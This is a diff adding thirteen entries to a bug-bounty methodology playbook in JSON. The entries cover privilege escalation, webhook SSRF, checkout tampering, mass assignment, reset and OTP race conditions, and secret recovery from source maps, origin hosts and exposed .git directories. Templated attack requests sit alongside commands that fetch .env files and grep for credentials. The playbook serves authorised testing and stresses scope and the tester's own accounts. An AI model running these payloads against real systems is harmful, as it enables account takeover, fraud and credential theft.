@@ -8695,6 +8695,149 @@
       "tell": "index.html loads a small runtime/manifest bundle alongside the main one, and the app is code-split (you see chunk files with a numeric id in the name). Also the fallback whenever a hunt stalls on 'the interesting UI is behind a paywall/role/feature flag I cannot reach' - the chunk for that feature is still downloadable and still names its endpoints.",
       "verify": "Confirm each chunk returns 200 with real content, and sum the bytes - that total is the artifact proving the sweep actually ran. Expect most named vendor chunks (monaco, reactflow, elkjs, wistia, d3) to be third-party libraries with no app routes and no secrets; the app's own API surface usually still lives in the main bundle, so a thin route yield from chunks is a NORMAL result, not a failed sweep. Do not claim a feature is reachable just because its chunk is - the chunk is client code, and the server still enforces the gate.",
       "source": "self:hunt33-2026-08-21"
+    },
+    {
+      "id": "pb0633",
+      "class": "privesc",
+      "stack": "web,api",
+      "difficulty": "medium",
+      "technique": "CHECK THE STATE WINDOW: an object that is created PENDING and confirmed later often has NO authorisation check in between. Invite/approval flows commonly guard two moments - the moment the object is created, and the moment it is acted on after confirmation - and leave the pending object freely editable. So a low role that is refused when it tries to invite someone AS an admin can often invite them at the default role and then edit the pending record's role before the invitee accepts. The record is written, the invitee accepts, and the elevated role is applied without any check ever seeing an unauthorised actor.",
+      "payload": "# 1. as the LOW role, invite at the default/lowest role - this is allowed\nPOST /api/workspace_invitations  {\"email\":\"<attacker-alias>\",\"role_id\":<default>}\n\n# 2. enumerate the roles you are NOT supposed to be able to assign\nGET  /api/workspaces/<wid>/roles   -> {\"role_id\":4561,\"is_custom_role\":true}\n\n# 3. edit the PENDING invitation before acceptance  <- the unguarded window\nPOST /api/workspace_invitations/<invite_id>/update_role\n     {\"role_id\": <admin-level id>}\n\n# 4. accept the invitation from the invited mailbox\n# other pending objects with the same shape:\n#   draft orders, unpublished posts, pending transfers, unconfirmed members,\n#   scheduled changes, unsubmitted approval requests",
+      "tell": "Any flow with a PENDING state and a separate confirm/accept step, especially invitations. The tell that the window exists: the same edit is REFUSED after acceptance but ALLOWED before it - if you can only test one, test the pending one first.",
+      "verify": "Prove the window, not just the write. Do the same role edit AFTER acceptance and show it is refused - that pair demonstrates the developer knew the operation needed a check and put it in only one place. Then confirm the resulting member actually holds the elevated role by listing members or acting as them; a 200 on the update endpoint is not proof the role stuck.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0634",
+      "class": "privesc",
+      "stack": "web,api",
+      "difficulty": "low",
+      "technique": "A REJECTED ROLE CAN FAIL OPEN. When a low-privileged caller submits a role they are not allowed to grant, the interesting outcome is not 403 - it is 201 WITH THE ROLE STRIPPED. The server refuses the value, creates the account with an EMPTY roles array, and somewhere downstream 'no role' is not treated as 'no permissions' but as 'not restricted'. The account then behaves as super-admin. Same family as a control that can be turned off: the deny path produced an object the authorisation model has no rule for, and the default was permissive.",
+      "payload": "POST /iam/v2/customers/<id>/users        # replay the ADMIN's invite request\nCookie: <LOW-PRIVILEGE session>          # but with the low role's session\n{\"name\":\"x\",\"email\":\"<attacker-alias>\",\"roles\":[\"admin\"]}\n\n-> 201 {\"roles\":[]}      <-- NOT a rejection. Check what roles:[] can DO.\n\n# then log in as the created account and test admin-only reads/writes\n# same shape to try:  \"roles\":[]  \"role\":null  \"role\":\"\"  \"role\":\"nonexistent\"\n#                     omit the role field entirely",
+      "tell": "Any create/invite endpoint that echoes back a roles/permissions array. If your submitted role vanishes from the response instead of erroring, the object is now in a state the UI can never produce - which is exactly where default-deny is most often missing.",
+      "verify": "The finding is NOT the 201 - it is what the role-less account can do. Log in as it and exercise an admin-only action, and record the result. Also create a NORMAL low-role account as a control and show it is refused the same action; without that control you cannot tell whether role-less is privileged or whether the action was open to everyone. State plainly whether the privilege is real or the account is simply broken.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0635",
+      "class": "privesc",
+      "stack": "web,api",
+      "difficulty": "medium",
+      "technique": "CLASSIFY EVERY RESOURCE BY SCOPE, THEN AIM THE LOWEST ROLE AT THE HIGHEST SCOPE. Most role testing checks whether a role can do its own job. The findings are in the cross-role tests, and specifically in objects whose BLAST RADIUS is bigger than the role's remit. Build a token for every role on two accounts, then sort every endpoint into environment-level / project-level / ACCOUNT-level. Account-level objects - webhooks, integrations, API tokens, audit logs, billing, SSO, team management - affect everything the organisation owns, so they should require the top role. Whether they actually do is per-endpoint, and it is frequently inconsistent within one API.",
+      "payload": "# mint a token per role, per account, at the START of the engagement\n# then for each account-level object, run the whole lifecycle as the LOW role:\n#   POST / GET / PATCH / DELETE on\n#   webhooks, integrations, tokens, auditlog, members, billing, sso\n\n# read the outcome by STAGE, not by pass/fail:\n#   403 + explicit deny  -> enforced for this role\n#   404                  -> may exist but is scoped out of your account\n#   200/201/204          -> FINDING; now check the blast radius\n\n# the strongest evidence is an ASYMMETRY inside one API:\n#   reader -> 403   (so the role model IS implemented)\n#   writer -> 201   (so it simply was not applied here)",
+      "tell": "A product that advertises a tiered role model (reader/writer/admin, viewer/editor/owner). The more sophisticated the role system looks, the more endpoints there are to get individually wrong - the complexity IS the attack surface.",
+      "verify": "The control that makes this reportable is the ROLE BELOW yours getting a clean 403 on the identical call. That proves enforcement exists and was omitted here, which pre-empts the 'working as intended' reply. Check the vendor's own role documentation before claiming intent (a brief may declare API-granted permissions intentional even when the console hides them), and verify the action had a real effect rather than returning 200 on a no-op.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0636",
+      "class": "ssrf",
+      "stack": "web,api",
+      "difficulty": "medium",
+      "technique": "A STORED URL MAY BE DIALLED BY THE CONFIGURATION ACTION ITSELF, NOT BY THE EVENT. The usual mental model for a webhook or integration is 'the server will call this later, when something happens' - which makes it look untestable without waiting for an event. On many platforms the outbound request fires IMMEDIATELY on create and again on every URL update, as a validation ping or a change notification. That turns a passive config field into a synchronous SSRF trigger you control completely: no event, no admin, no waiting.",
+      "payload": "# 1. create pointing at a listener YOU control, and watch it in real time\nPOST /api/v2/webhooks {\"url\":\"https://<your-listener>/create-probe\",\"on\":true}\n\n# 2. patch the URL - a SECOND request usually fires here\nPATCH /api/v2/webhooks/<id>  [{\"op\":\"replace\",\"path\":\"/url\",\n                              \"value\":\"https://<your-listener>/patch-probe\"}]\n\n# distinct paths per step tell you WHICH action dialled.\n# read the inbound request fully - the body is often the platform's own\n# audit record and can name the actor, the token and the old/new values,\n# which is self-proving evidence you did not have to argue for.",
+      "tell": "Any URL field on an account-level object: webhooks, log shipping, external search/metrics endpoints, schema registries, connector configs. Ask the question explicitly - does this dial on CREATE, on UPDATE, or only on an event?",
+      "verify": "Silence is not proof of absence: the fetcher may speak a non-HTTP protocol, may treat a non-2xx as a failed delivery and retry, or may not follow redirects - use a listener that speaks the RIGHT protocol and exercise it with the target's own HTTP method. Separate the two claims when reporting: 'the destination filter is absent and the fetcher reaches attacker-specified hosts' is provable from your listener; 'we read cloud metadata' is NOT, because the response goes to the platform and never to you. Claim only the first unless you can show the retrieved data.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0637",
+      "class": "business-logic",
+      "stack": "web,api",
+      "difficulty": "low",
+      "technique": "THE PRIMARY AMOUNT IS VALIDATED; THE OTHER MONEY FIELDS ARE NOT. Developers harden the field named price or total because that is the obvious one, then compute the charge from a handful of secondary fields nobody guarded: delivery, handling, platform fee, service charge, gift wrap, insurance, tip, tax, currency, and the quantity multiplier. Attack the arithmetic instead of the headline number. Two shapes matter most - a FRACTIONAL quantity, where the server books the integer you asked for but bills quantity x price (0.3 x 10 = 3 for 3 seats), and a NEGATIVE line item, which makes the order total owe you money.",
+      "payload": "# enumerate every numeric field in the checkout body first - do not guess\n# then vary ONE at a time, keeping a clean control order for comparison:\n\nquantity: 0.3          # fractional  -> books 3, bills 0.3 x unit\nquantity: -2           # negative    -> total goes below zero\nquantity: 2147483648   # 32-bit wrap -> may land negative\nshipping_fee: -50      # secondary field, usually unguarded\nhandling_fee: 0\ncurrency: \"<weak currency>\"\n\n# TWO-STEP CONVERSION: if the price is computed in one currency and\n# converted at checkout, set the BASE currency to the weak one so the\n# conversion becomes 1:1 - the amount stays, the unit changes.\n# Then RELOAD the payment page; the recalculation is what applies it.",
+      "tell": "A checkout or invoice body carrying more than one numeric field, or any UI that shows a computed subtotal. Also any flow where a price is quoted in one currency and settled in another.",
+      "verify": "Verdict on the CHARGED amount, never the displayed one - refetch the order/invoice server-side after completing it. A response echoing your tampered value proves nothing; the order record does. On a live programme use the smallest deviation that proves the flaw (one unit, one cent) rather than the largest, and never complete a real-money transaction outside a sandbox: use the vendor's test cards.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0638",
+      "class": "mass-assignment",
+      "stack": "web,api",
+      "difficulty": "low",
+      "technique": "TWO ORACLES THAT TELL YOU A HIDDEN FIELD IS REAL BEFORE YOU TRY TO ABUSE IT. (1) DIFF THE READ AGAINST THE WRITE: GET the object and compare its fields to what the PATCH body sends. Fields present in the response but absent from the request are exactly the auto-bound candidates - id, isAdmin, role, balance, status, verified, ownerId. You are not guessing field names; the object hands them to you. (2) SEND AN INVALID VALUE FIRST: submit the candidate with a type or value the backend cannot accept (isAdmin as the string foo instead of true). If the response differs from the same request with a VALID value, the field reached the query logic and is being processed. If both are identical, it is being dropped and the field is dead.",
+      "payload": "GET   /api/users/123   -> {\"id\":123,\"name\":\"x\",\"email\":\"...\",\"isAdmin\":false}\nPATCH /api/users/123      {\"username\":\"x\",\"email\":\"...\"}\n#                            ^ fields in the response you never sent\n\n# oracle 2 - three requests, compare responses:\nPATCH {...,\"isAdmin\":false}   # valid, matches current state\nPATCH {...,\"isAdmin\":\"foo\"}   # INVALID type\nPATCH {...,\"isAdmin\":true}    # the actual attempt\n\n# different behaviour on the invalid one => the field is processed\n# identical on all three         => it is stripped; stop here\n\n# high-yield spots that are NOT the profile endpoint:\n#   registration/signup (no prior session to check the role against)\n#   the PENDING record in an invite flow\n#   PATCH on your own freshly-created account: {\"is_verified\":true}",
+      "tell": "Any JSON API on a framework with model auto-binding, and especially any endpoint whose response object is richer than its request body.",
+      "verify": "Read the FIELD, not the status - refetch the object and confirm the value changed, then exercise the privilege it supposedly grants. Beware the reverse trap: a 200 on a write that sets a field to the value it already held is a no-op and may never consult authorisation at all, so always change the value to something different from current. Use inert probe fields where possible so an accepted write cannot damage the account.",
+      "source": "medium+portswigger:2026-ingest-d"
+    },
+    {
+      "id": "pb0639",
+      "class": "race",
+      "stack": "web,api",
+      "difficulty": "medium",
+      "technique": "RACE THE IDENTITY IN A MULTI-STEP FLOW, NOT JUST THE COUNTER. Limit-bypass races are the familiar shape, but the higher-impact version races the SUBJECT of a flow rather than its count. Multi-step auth flows (request reset -> receive token -> submit token; init login -> send OTP -> verify OTP) frequently keep the in-progress identity in one mutable slot keyed by session. Start the flow as yourself, then change the identity to the victim before the final step: the token or OTP delivered to YOU gets validated against THEIR account. Same for single-use tokens - two parallel submissions of one token can both pass the not-yet-used check before either marks it used.",
+      "payload": "# A. reset-token rebind - same session, back to back\nPOST /reset_password  username=<attacker-address>        # token X emailed to me\nPOST /reset_password  username=<victim-address>  # slot overwritten, token kept\n# then redeem token X -> sets the victim's password\n\n# B. OTP identity swap - send the last two requests together\nPOST /login/init   {\"email\":\"<attacker-address>\"}        # OTP delivered to me\nPOST /login/email  {\"email\":\"<victim-address>\"}  # ] same\nPOST /login/verify {\"otp\":\"<my code>\"}            # ] moment\n\n# C. single-use token, twice, in one packet\n# send both submissions grouped so neither sees the other's write",
+      "tell": "Any flow where an identifier (email, username, phone, account id) can still be changed AFTER a secret has been issued but BEFORE it is verified. The give-away is a separate init step that accepts the identifier and returns nothing sensitive.",
+      "verify": "Use your own two accounts as attacker and victim - never a real user's address. Verdict on END STATE: did the victim account's password actually change, is the session you hold really theirs? Two 200s prove nothing on their own. Record how many attempts were needed and note that the result is timing-dependent; a race that fires 1 in 10 times is still a valid finding but say so plainly rather than implying determinism.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0640",
+      "class": "info-disclosure",
+      "stack": "web,spa",
+      "difficulty": "low",
+      "technique": "SOURCE MAPS HAND YOU THE ORIGINAL SOURCE TREE, AND THEIR EXPOSURE IS ITSELF A FINDING. A minified bundle often ends with a sourceMappingURL comment naming main.<hash>.js.map. If that file is served, it reconstructs the developer-written code - real variable names, file structure, comments, TODO/FIXME notes, internal endpoints, and any secret that minification merely made ugly. This is the highest-yield single step in JS recon and it costs one request. Check it BEFORE grinding through minified code, because it may make the grinding unnecessary.",
+      "payload": "# does it exist? (also try /static/js/, /assets/js/, /build/static/js/)\ncurl -sI https://<host>/static/js/main.<hash>.js.map\n\n# list the original source tree without any tooling\ncurl -s https://<host>/static/js/main.<hash>.js.map | jq '.sources[]'\n\n# reconstruct it\nsourcemapper -url https://<host>/js/app.js.map -output ./src/\ngrep -rniE 'sk_live|AKIA|client_secret|password|internal[.]|admin' ./src/\n\n# a bundle with no .map still leaks: check the tail for sourceMappingURL,\n# and try the same filename under a build/ or dev/ prefix",
+      "tell": "Any hashed production bundle. Frameworks default source maps ON in development and teams forget to disable them for production builds (webpack devtool, vite build.sourcemap, next productionBrowserSourceMaps).",
+      "verify": "Confirm the .map is served unauthenticated and actually parses - a 200 returning the SPA index.html is the catch-all, not a source map, so check the content type and that jq finds a sources array. Report the exposure itself only where the programme accepts it; otherwise treat it as recon and report what it REVEALS. If it yields a credential, apply the publishable-vs-confidential calibration before claiming anything, and stop at disclosure if the brief says not to probe scope.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0641",
+      "class": "recon",
+      "stack": "web,spa",
+      "difficulty": "medium",
+      "technique": "DIFF TODAY'S BUNDLE AGAINST AN ARCHIVED ONE - REMOVED FROM THE FRONTEND RARELY MEANS REMOVED FROM THE BACKEND. When a feature is deprecated the UI stops calling it, but the route usually survives on the server, often with the authorisation check that was written for a context nobody exercises any more. Historical JavaScript is a free, passive, zero-touch source of those routes: pull every JS URL the archive ever saw, subtract the ones still live, and read what only exists in the past.",
+      "payload": "# every JS URL ever crawled for the domain - touches the target ZERO times\ncurl -s 'https://web.archive.org/cdx/search/cdx?url=<domain>/*&output=text&fl=original&collapse=urlkey&filter=mimetype:application/javascript' > passive.txt\n\n# live inventory (view-source, not DevTools: raw server output, no JS injection)\ncurl -s https://<host>/ | grep -oE '<script[^>]+src=\"[^\"]+\"' > live.txt\n\n# what existed then and not now = highest priority\ncomm -23 <(sort passive.txt) <(sort live.txt) > historical_only.txt\n\n# diff the endpoint sets, not the files\ndiff <(grep -oh '\"/api/[^\"]*\"' current.js   | sort -u) \\\n     <(grep -oh '\"/api/[^\"]*\"' archived_*.js | sort -u)\n# lines only in the archive -> test each with an authenticated session",
+      "tell": "Any target older than a couple of years, and especially one that has visibly redesigned or migrated an admin area. Also worth re-running on active programmes every few weeks - new bundles ship with new routes.",
+      "verify": "A historical route that answers is not automatically a bug: confirm it still performs a real action, then test it for the authorisation the live routes have. Skip vendor libraries entirely when triaging (react, lodash, d3, monaco, reactflow) - they hold no app routes and reading them is procrastination. Record WHY each lead is a lead ('present only in Q3-2022 builds, suggests a decommissioned admin migration'), because that note is what tells you how to validate it later.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0642",
+      "class": "info-disclosure",
+      "stack": "web",
+      "difficulty": "low",
+      "technique": "WHEN THE EDGE BLOCKS A PATH, ASK THE ORIGIN DIRECTLY. A CDN, WAF or reverse proxy commonly carries the rule that denies dotfiles and config paths - and the origin behind it carries no such rule. If you can reach the origin hostname (a platform default domain, a CNAME target, a storage endpoint), the same request that 403s at the edge may be served in full. The protection was deployed at one layer and the other layer was never hardened.",
+      "payload": "# find the origin: CNAME chain, cert transparency, historical DNS\ndig +short <host> CNAME\ncurl -s 'https://crt.sh/?q=%25.<domain>&output=json' | jq -r '.[].name_value' | sort -u\n\n# same path, both layers - compare\ncurl -si https://<edge-host>/.env      # 403 at the edge\ncurl -si https://<origin-host>/.env    # may be 200\n\n# also try: /.git/config  /.env.bak  /.env.local  /config.json\n#           /application.yml  /credentials.json\n# and the reverse case: a path that 404s at the edge but exists on the origin",
+      "tell": "Any target whose response headers name a CDN while the application is clearly hosted elsewhere. A 403 on a dotfile is itself the tell - something bothered to write a rule, which means the file may well be there.",
+      "verify": "Confirm the origin is IN SCOPE before sending it anything - a platform default hostname is frequently NOT in the programme's target list even though the application is, and testing it is then out of scope regardless of what it returns. Reading a hostname out of DNS is passive; sending it requests is not. If it is out of scope, report the edge/origin inconsistency against the in-scope host and let them look.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0643",
+      "class": "info-disclosure",
+      "stack": "web",
+      "difficulty": "medium",
+      "technique": "AN EXPOSED .git DIRECTORY CONTAINS EVERY VERSION OF EVERY FILE, INCLUDING THE SECRETS SOMEONE 'REMOVED'. Deleting a credential from a file and committing the fix does not delete it - the old blob stays in history forever. If the .git directory is served, the whole history is downloadable, and the highest-value commits are precisely the ones whose messages say they are cleaning something up.",
+      "payload": "curl -sI https://<host>/.git/HEAD        # 200 or redirect = worth pursuing\n\ngit-dumper https://<host>/.git/ ./repo/\n\ncd repo\ngit log --all -p | grep -niE 'password|secret|api[_-]?key|token|AKIA|sk_live'\ngit log --all --oneline | grep -iE 'remove|delete|rotate|clean|oops|revert'\ngit log --all --diff-filter=D --summary | grep delete   # deleted files\n\n# same idea, no git: backup copies left beside the original\n# config.php.bak  .env.old  wp-config.php~  settings.py.swp  index.php.save",
+      "tell": "A 200 or 403 (rather than a clean 404) on /.git/HEAD or /.git/config. Older deployments, anything rsynced or FTP-uploaded rather than built by a pipeline.",
+      "verify": "Confirm you have real object data, not the SPA catch-all - /.git/HEAD should return a ref line, not HTML. Treat anything you recover as live until proven otherwise: report the credential, and do not exercise it if the brief says to leave scope determination to them. Note honestly that a secret found in history may already be rotated; that is the programme's call to make, not a reason to withhold it.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0644",
+      "class": "info-disclosure",
+      "stack": "web",
+      "difficulty": "low",
+      "technique": "FOUR MISTAKES THAT TURN A REAL SECRET INTO A REJECTED REPORT - a negative-result checklist worth more than most findings. A researcher found a genuine RSA private key in a production bundle, forged JWTs with it, and still had the report closed. The key signed logging payloads rather than authentication; the endpoints tested were GUESSED rather than captured; the 200 responses carried error bodies that were read as acceptance; and the impact section argued theory instead of showing effect. Every one of those is avoidable before you press submit.",
+      "payload": "# BEFORE claiming a secret is exploitable, in this order:\n# 1. CAPTURE, do not guess. Find where the value is USED in the bundle:\n#      grep -oE '.{140}<VALUE_OR_VAR>.{200}' bundle.js\n#    a value passed as client_secret / Authorization is a credential;\n#    the same-looking string used to sign a log payload is not.\n# 2. Drive the real feature in the browser and read the actual request.\n#    An endpoint you invented answering 404 tells you nothing.\n# 3. READ THE BODY, NOT THE STATUS:\n#      curl -si ... | tail -20     # 200 {\"error\":\"invalid_client\"} is FAILURE\n# 4. Show the effect. One screenshot of a state that could not exist\n#    without the flaw beats three paragraphs of what an attacker could do.",
+      "tell": "Fires whenever you are about to write the words 'an attacker could' without having done the thing. Also whenever a high-entropy string is assumed to be an auth credential purely because it looks random.",
+      "verify": "State what you did and what you did NOT do, explicitly - it protects the report's credibility when a triager finds the gap themselves. Keep it short: length is read as noise, and some programmes explicitly delay or ban submissions padded with generated text. Calibrate the value first - publishable-by-design keys (pk_live_, RUM tokens, OAuth client IDs, subscribe keys, search keys, error-reporting DSNs) are not findings, while values named *_secret, sk_live_, server SDK keys, publish keys, vendor AUTH tokens carrying read/write scopes, and private keys are.",
+      "source": "medium:2026-ingest-d"
+    },
+    {
+      "id": "pb0645",
+      "class": "business-logic",
+      "stack": "web,api",
+      "difficulty": "low",
+      "technique": "MAP THE VALIDATOR'S BOUNDARIES INSTEAD OF GUESSING PAST IT, AND CHECK WHETHER THE LIMIT ITSELF IS CLIENT-SUPPLIED. When a field is rejected, the useful move is not a bigger payload - it is a short sweep that tells you exactly which rule fired and which fields have no rule at all. Then look one level up: forms and request bodies sometimes carry the CONSTRAINT alongside the value (max_allowed, limit, maxQuantity, allowedRoles). Changing the constraint is cheaper than defeating it, and it is often unguarded because the developer thinks of it as display metadata.",
+      "payload": "# sweep one field to find the actual rule\nage=17 -> 403   age=18 -> 200   age=150 -> 403   age=0 -> 403   age=-1 -> 403\nage=\"18\" -> 200        # string accepted where int expected\nage=18.0 / 018 / +18   # parser quirks\nage=abc  -> 500        # a 500 is a finding of its own: unhandled type\n\n# isolate WHICH field is validated - vary one, hold the rest clean\n# then send the whole body with only the unvalidated field changed\n\n# the limit as data:\n<input type=\"hidden\" name=\"max_allowed\" value=\"100\">\nPOST /withdraw  max_allowed=999999&withdraw_amount=999999\n\n# type confusion on identifiers, which can skip a check entirely:\n{\"user_id\":123} -> \"123\" / true / null / [123]",
+      "tell": "Any hidden input or JSON field that describes a rule rather than a value, and any endpoint that rejects one field while silently accepting everything else in the same body.",
+      "verify": "Do not report the sweep - report the one request that produced a state change, with a control showing the normal path refused. A 500 is not automatically a bug either: capture what it leaks (stack trace, internal enum, framework version) and judge it on that. Never send a value that would actually move money or destroy data just to map a boundary; probe with amounts that are inert if accepted.",
+      "source": "medium:2026-ingest-d"
     }
   ]
 }
